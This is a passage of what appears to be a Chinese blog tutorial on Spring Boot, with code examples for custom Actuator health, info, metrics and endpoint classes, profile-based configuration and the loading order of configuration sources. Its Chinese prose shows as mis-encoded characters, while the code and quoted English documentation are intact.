align="left"><code>management.endpoints.web.exposure.exclude</code></td><td align="left"></td></tr><tr><td align="left"><code>management.endpoints.web.exposure.include</code></td><td align="left"><code>info, health</code></td></tr></tbody></table><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#production-ready-endpoints-exposing-endpoints">å®˜æ–¹æ–‡æ¡£ - Exposing Endpoints</a></p><h2 id="79ã€æŒ‡æ ‡ç›‘æ§-å®šåˆ¶Endpoint"><a href="#79ã€æŒ‡æ ‡ç›‘æ§-å®šåˆ¶Endpoint" class="headerlink" title="79ã€æŒ‡æ ‡ç›‘æ§-å®šåˆ¶Endpoint"></a>79ã€æŒ‡æ ‡ç›‘æ§-å®šåˆ¶Endpoint</h2><h3 id="å®šåˆ¶-Health-ä¿¡æ¯"><a href="#å®šåˆ¶-Health-ä¿¡æ¯" class="headerlink" title="å®šåˆ¶ Health ä¿¡æ¯"></a>å®šåˆ¶ Health ä¿¡æ¯</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">management:</span><br>    <span class="hljs-attr">health:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>      <span class="hljs-attr">show-details:</span> <span class="hljs-string">always</span> <span class="hljs-comment">#æ€»æ˜¯æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ã€‚å¯æ˜¾ç¤ºæ¯ä¸ªæ¨¡å—çš„çŠ¶æ€ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡å®ç°<code>HealthIndicator </code>æ¥å£ï¼Œæˆ–ç»§æ‰¿<code>MyComHealthIndicator </code>ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.actuate.health.Health;<br><span class="hljs-keyword">import</span> org.springframework.boot.actuate.health.HealthIndicator;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHealthIndicator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HealthIndicator</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Health <span class="hljs-title function_">health</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">errorCode</span> <span class="hljs-operator">=</span> check(); <span class="hljs-comment">// perform some specific health check</span><br>        <span class="hljs-keyword">if</span> (errorCode != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> Health.down().withDetail(<span class="hljs-string">&quot;Error Code&quot;</span>, errorCode).build();<br>        &#125;<br>        <span class="hljs-keyword">return</span> Health.up().build();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ„å»ºHealth</span><br><span class="hljs-comment">Health build = Health.down()</span><br><span class="hljs-comment">                .withDetail(&quot;msg&quot;, &quot;error service&quot;)</span><br><span class="hljs-comment">                .withDetail(&quot;code&quot;, &quot;500&quot;)</span><br><span class="hljs-comment">                .withException(new RuntimeException())</span><br><span class="hljs-comment">                .build();</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyComHealthIndicator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHealthIndicator</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * çœŸå®çš„æ£€æŸ¥æ–¹æ³•</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> builder</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doHealthCheck</span><span class="hljs-params">(Health.Builder builder)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//mongodbã€‚  è·å–è¿æ¥è¿›è¡Œæµ‹è¯•</span><br>        Map&lt;String,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">// æ£€æŸ¥å®Œæˆ</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span> == <span class="hljs-number">2</span>)&#123;<br><span class="hljs-comment">//            builder.up(); //å¥åº·</span><br>            builder.status(Status.UP);<br>            map.put(<span class="hljs-string">&quot;count&quot;</span>,<span class="hljs-number">1</span>);<br>            map.put(<span class="hljs-string">&quot;ms&quot;</span>,<span class="hljs-number">100</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//            builder.down();</span><br>            builder.status(Status.OUT_OF_SERVICE);<br>            map.put(<span class="hljs-string">&quot;err&quot;</span>,<span class="hljs-string">&quot;è¿æ¥è¶…æ—¶&quot;</span>);<br>            map.put(<span class="hljs-string">&quot;ms&quot;</span>,<span class="hljs-number">3000</span>);<br>        &#125;<br><br><br>        builder.withDetail(<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-number">100</span>)<br>                .withDetails(map);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å®šåˆ¶infoä¿¡æ¯"><a href="#å®šåˆ¶infoä¿¡æ¯" class="headerlink" title="å®šåˆ¶infoä¿¡æ¯"></a>å®šåˆ¶infoä¿¡æ¯</h3><p>å¸¸ç”¨ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>ç¼–å†™é…ç½®æ–‡ä»¶</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">appName:</span> <span class="hljs-string">boot-admin</span><br>  <span class="hljs-attr">version:</span> <span class="hljs-number">2.0</span><span class="hljs-number">.1</span><br>  <span class="hljs-attr">mavenProjectName:</span> <span class="hljs-string">@project.artifactId@</span>  <span class="hljs-comment">#ä½¿ç”¨@@å¯ä»¥è·å–mavençš„pomæ–‡ä»¶å€¼</span><br>  <span class="hljs-attr">mavenProjectVersion:</span> <span class="hljs-string">@project.version@</span><br></code></pre></td></tr></table></figure><ul><li>ç¼–å†™InfoContributor</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Collections;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.actuate.info.Info;<br><span class="hljs-keyword">import</span> org.springframework.boot.actuate.info.InfoContributor;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleInfoContributor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InfoContributor</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contribute</span><span class="hljs-params">(Info.Builder builder)</span> &#123;<br>        builder.withDetail(<span class="hljs-string">&quot;example&quot;</span>,<br>                Collections.singletonMap(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><a href="http://localhost:8080/actuator/info">http://localhost:8080/actuator/info</a> ä¼šè¾“å‡ºä»¥ä¸Šæ–¹å¼è¿”å›çš„æ‰€æœ‰infoä¿¡æ¯</p><h3 id="å®šåˆ¶Metricsä¿¡æ¯"><a href="#å®šåˆ¶Metricsä¿¡æ¯" class="headerlink" title="å®šåˆ¶Metricsä¿¡æ¯"></a>å®šåˆ¶Metricsä¿¡æ¯</h3><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#production-ready-metrics-meter">Spring Bootæ”¯æŒçš„metrics</a></p><p>å¢åŠ å®šåˆ¶Metricsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyService</span>&#123;<br>    Counter counter;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyService</span><span class="hljs-params">(MeterRegistry meterRegistry)</span>&#123;<br>         counter = meterRegistry.counter(<span class="hljs-string">&quot;myservice.method.running.counter&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> &#123;<br>        counter.increment();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹å¼</span><br><span class="hljs-meta">@Bean</span><br>MeterBinder <span class="hljs-title function_">queueSize</span><span class="hljs-params">(Queue queue)</span> &#123;<br>    <span class="hljs-keyword">return</span> (registry) -&gt; Gauge.builder(<span class="hljs-string">&quot;queueSize&quot;</span>, queue::size).register(registry);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å®šåˆ¶Endpoint"><a href="#å®šåˆ¶Endpoint" class="headerlink" title="å®šåˆ¶Endpoint"></a>å®šåˆ¶Endpoint</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Endpoint(id = &quot;container&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DockerEndpoint</span> &#123;<br><br>    <span class="hljs-meta">@ReadOperation</span><br>    <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">getDockerInfo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> Collections.singletonMap(<span class="hljs-string">&quot;info&quot;</span>,<span class="hljs-string">&quot;docker started...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@WriteOperation</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">restartDocker</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;docker restarted....&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åœºæ™¯ï¼š</p><ul><li>å¼€å‘ReadinessEndpointæ¥ç®¡ç†ç¨‹åºæ˜¯å¦å°±ç»ªã€‚</li><li>å¼€å‘LivenessEndpointæ¥ç®¡ç†ç¨‹åºæ˜¯å¦å­˜æ´»ã€‚</li></ul><h2 id="80ã€æŒ‡æ ‡ç›‘æ§-Boot-Admin-Server"><a href="#80ã€æŒ‡æ ‡ç›‘æ§-Boot-Admin-Server" class="headerlink" title="80ã€æŒ‡æ ‡ç›‘æ§-Boot Admin Server"></a>80ã€æŒ‡æ ‡ç›‘æ§-Boot Admin Server</h2><p><a href="">å®˜æ–¹Github</a></p><p><a href="https://codecentric.github.io/spring-boot-admin/2.3.1/#getting-started">å®˜æ–¹æ–‡æ¡£</a></p><p>å¯è§†åŒ–æŒ‡æ ‡ç›‘æ§</p><blockquote><p>What is Spring Boot Admin?</p><p>codecentricâ€™s Spring Boot Admin is a community project to manage and monitor your <a href="http://projects.spring.io/spring-boot/">Spring Boot</a> Â® applications. The applications register with our Spring Boot Admin Client (via HTTP) or are discovered using Spring Cloud Â® (e.g. Eureka, Consul). The UI is just a Vue.js application on top of the Spring Boot Actuator endpoints.</p></blockquote><p><a href="https://codecentric.github.io/spring-boot-admin/2.3.1/#getting-started">å¼€å§‹ä½¿ç”¨æ–¹æ³•</a></p><h2 id="81ã€é«˜çº§ç‰¹æ€§-Profileç¯å¢ƒåˆ‡æ¢"><a href="#81ã€é«˜çº§ç‰¹æ€§-Profileç¯å¢ƒåˆ‡æ¢" class="headerlink" title="81ã€é«˜çº§ç‰¹æ€§-Profileç¯å¢ƒåˆ‡æ¢"></a>81ã€é«˜çº§ç‰¹æ€§-Profileç¯å¢ƒåˆ‡æ¢</h2><p>ä¸ºäº†æ–¹ä¾¿å¤šç¯å¢ƒé€‚é…ï¼ŒSpring Bootç®€åŒ–äº†profileåŠŸèƒ½ã€‚</p><ul><li>é»˜è®¤é…ç½®æ–‡ä»¶<code>application.yaml</code>ä»»ä½•æ—¶å€™éƒ½ä¼šåŠ è½½ã€‚</li><li>æŒ‡å®šç¯å¢ƒé…ç½®æ–‡ä»¶<code>application-&#123;env&#125;.yaml</code>ï¼Œ<code>env</code>é€šå¸¸æ›¿ä»£ä¸º<code>test</code>ï¼Œ</li><li>æ¿€æ´»æŒ‡å®šç¯å¢ƒ<ul><li>é…ç½®æ–‡ä»¶æ¿€æ´»ï¼š<code>spring.profiles.active=prod</code></li><li>å‘½ä»¤è¡Œæ¿€æ´»ï¼š<code>java -jar xxx.jar --spring.profiles.active=prod  --person.name=haha</code>ï¼ˆä¿®æ”¹é…ç½®æ–‡ä»¶çš„ä»»æ„å€¼ï¼Œ<strong>å‘½ä»¤è¡Œä¼˜å…ˆ</strong>ï¼‰</li></ul></li><li>é»˜è®¤é…ç½®ä¸ç¯å¢ƒé…ç½®åŒæ—¶ç”Ÿæ•ˆ</li><li>åŒåé…ç½®é¡¹ï¼Œprofileé…ç½®ä¼˜å…ˆ</li></ul><h3 id="Profileæ¡ä»¶è£…é…åŠŸèƒ½"><a href="#Profileæ¡ä»¶è£…é…åŠŸèƒ½" class="headerlink" title="@Profileæ¡ä»¶è£…é…åŠŸèƒ½"></a>@Profileæ¡ä»¶è£…é…åŠŸèƒ½</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(&quot;person&quot;)</span><span class="hljs-comment">//åœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>&#125;<br></code></pre></td></tr></table></figure><p>application.properties</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span> <br>  <span class="hljs-attr">name:</span> <span class="hljs-string">lun</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123;<br><br>   String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br>   Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>;<br><br>&#125;<br><br><span class="hljs-meta">@Profile(&quot;test&quot;)</span><span class="hljs-comment">//åŠ è½½application-test.yamlé‡Œçš„</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(&quot;person&quot;)</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>&#125;<br><br><span class="hljs-meta">@Profile(value = &#123;&quot;prod&quot;,&quot;default&quot;&#125;)</span><span class="hljs-comment">//åŠ è½½application-prod.yamlé‡Œçš„</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(&quot;person&quot;)</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Boss</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>&#125;<br></code></pre></td></tr></table></figure><p>application-test.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">test-å¼ ä¸‰</span><br><br><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure><p>application-prod.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">prod-å¼ ä¸‰</span><br><br><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># æ¿€æ´»prodé…ç½®æ–‡ä»¶</span><br><span class="hljs-attr">spring.profiles.active</span>=<span class="hljs-string">prod</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> Person person;<br><br><span class="hljs-meta">@GetMapping(&quot;/&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//æ¿€æ´»äº†prodï¼Œåˆ™è¿”å›Bossï¼›æ¿€æ´»äº†testï¼Œåˆ™è¿”å›Worker</span><br>    <span class="hljs-keyword">return</span> person.getClass().toString();<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>@Profileè¿˜å¯ä»¥ä¿®é¥°åœ¨æ–¹æ³•ä¸Šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Color</span> &#123;<br>&#125;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br><br>    <span class="hljs-meta">@Profile(&quot;prod&quot;)</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Color <span class="hljs-title function_">red</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>();<br>    &#125;<br><br>    <span class="hljs-meta">@Profile(&quot;test&quot;)</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Color <span class="hljs-title function_">green</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>å¯ä»¥æ¿€æ´»ä¸€ç»„ï¼š</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.profiles.active</span>=<span class="hljs-string">production</span><br><br><span class="hljs-attr">spring.profiles.group.production[0]</span>=<span class="hljs-string">proddb</span><br><span class="hljs-attr">spring.profiles.group.production[1]</span>=<span class="hljs-string">prodmq</span><br></code></pre></td></tr></table></figure><h2 id="82ã€é«˜çº§ç‰¹æ€§-é…ç½®åŠ è½½ä¼˜å…ˆçº§"><a href="#82ã€é«˜çº§ç‰¹æ€§-é…ç½®åŠ è½½ä¼˜å…ˆçº§" class="headerlink" title="82ã€é«˜çº§ç‰¹æ€§-é…ç½®åŠ è½½ä¼˜å…ˆçº§"></a>82ã€é«˜çº§ç‰¹æ€§-é…ç½®åŠ è½½ä¼˜å…ˆçº§</h2><h3 id="å¤–éƒ¨åŒ–é…ç½®"><a href="#å¤–éƒ¨åŒ–é…ç½®" class="headerlink" title="å¤–éƒ¨åŒ–é…ç½®"></a>å¤–éƒ¨åŒ–é…ç½®</h3><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#boot-features-external-config">å®˜æ–¹æ–‡æ¡£ - Externalized Configuration</a></p><p>Spring Boot uses a very particular <code>PropertySource</code> order that is designed to allow sensible overriding of values. Properties are considered in the following order (with values from lower items overriding earlier ones)ï¼ˆ1ä¼˜å…ˆçº§æœ€ä½ï¼Œ14ä¼˜å…ˆçº§æœ€é«˜ï¼‰:</p><ol><li>Default properties (specified by setting <code>SpringApplication.setDefaultProperties</code>).</li><li><a href="https://docs.spring.io/spring/docs/5.3.3/javadoc-api/org/springframework/context/annotation/PropertySource.html"><code>@PropertySource</code></a> annotations on your <code>@Configuration</code> classes. Please note that such property sources are not added to the <code>Environment</code> until the application context is being refreshed. This is too late to configure certain properties such as <code>logging.*</code> and <code>spring.main.*</code> which are read before refresh begins.</li><li>Config data (such as <code>application.properties</code> files)</li><li>A <code>RandomValuePropertySource</code> that has properties only in <code>random.*</code>.</li><li>OS environment variables.</li><li>Java System properties (<code>System.getProperties()</code>).</li><li>JNDI attributes from <code>java:comp/env</code>.</li><li><code>ServletContext</code> init parameters.</li><li><code>ServletConfig</code> init parameters.</li><li>Properties from <code>SPRING_APPLICATION_JSON</code> (inline JSON embedded in an environment variable or system property).</li><li>Command line arguments.</li><li><code>properties</code> attribute on your tests. Available on <a href="https://docs.spring.io/spring-boot/docs/2.4.2/api/org/springframework/boot/test/context/SpringBootTest.html"><code>@SpringBootTest</code></a> and the <a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#boot-features-testing-spring-boot-applications-testing-autoconfigured-tests">test annotations for testing a particular slice of your application</a>.</li><li><a href="https://docs.spring.io/spring/docs/5.3.3/javadoc-api/org/springframework/test/context/TestPropertySource.html"><code>@TestPropertySource</code></a> annotations on your tests.</li><li><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#using-boot-devtools-globalsettings">Devtools global settings properties</a> in the <code>$HOME/.config/spring-boot</code> directory when devtools is active.</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.stereotype.*;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.*;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBean</span> &#123;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;name&#125;&quot;)</span><span class="hljs-comment">//ä»¥è¿™ç§æ–¹å¼å¯ä»¥è·å¾—é…ç½®å€¼</span><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-comment">// ...</span><br><br>&#125;<br></code></pre></td></tr></table></figure><hr><ul><li>å¤–éƒ¨é…ç½®æº<ul><li>Javaå±æ€§æ–‡ä»¶ã€‚</li><li>YAMLæ–‡ä»¶ã€‚</li><li>ç¯å¢ƒå˜é‡ã€‚</li><li>å‘½ä»¤è¡Œå‚æ•°ã€‚</li></ul></li><li>é…ç½®æ–‡ä»¶æŸ¥æ‰¾ä½ç½®<ol><li>classpath æ ¹è·¯å¾„ã€‚</li><li>classpath æ ¹è·¯å¾„ä¸‹configç›®å½•ã€‚</li><li>jaråŒ…å½“å‰ç›®å½•ã€‚</li><li>jaråŒ…å½“å‰ç›®å½•çš„configç›®å½•ã€‚</li><li>&#x2F;configå­ç›®å½•çš„ç›´æ¥å­ç›®å½•ã€‚</li></ol></li><li>é…ç½®æ–‡ä»¶åŠ è½½é¡ºåºï¼š<ol><li>å½“å‰jaråŒ…å†…éƒ¨çš„<code>application.properties</code>å’Œ<code>application.yml</code>ã€‚</li><li>å½“å‰jaråŒ…å†…éƒ¨çš„<code>application-&#123;profile&#125;.properties</code> å’Œ <code>application-&#123;profile&#125;.yml</code>ã€‚</li><li>å¼•ç”¨çš„å¤–éƒ¨jaråŒ…çš„<code>application.properties</code>å’Œ<code>application.yml</code>ã€‚</li><li>å¼•ç”¨çš„å¤–éƒ¨jaråŒ…çš„<code>application-&#123;profile&#125;.properties</code>å’Œ<code>application-&#123;profile&#125;.yml</code>ã€‚</li></ol></li><li>æŒ‡å®šç¯å¢ƒä¼˜å…ˆï¼Œå¤–éƒ¨ä¼˜å…ˆï¼Œåé¢çš„å¯ä»¥è¦†ç›–å‰é¢çš„åŒåé…ç½®é¡¹ã€‚</li></ul><h2 id="83ã€é«˜çº§ç‰¹æ€§-è‡ªå®šä¹‰starterç»†èŠ‚"><a href="#83ã€é«˜çº§ç‰¹æ€§-è‡ªå®šä¹‰starterç»†èŠ‚" class="headerlink" title="83ã€é«˜çº§ç‰¹æ€§-è‡ªå®šä¹‰starterç»†èŠ‚"></a>83ã€é«˜çº§ç‰¹æ€§-è‡ªå®šä¹‰starterç»†èŠ‚</h2><h3 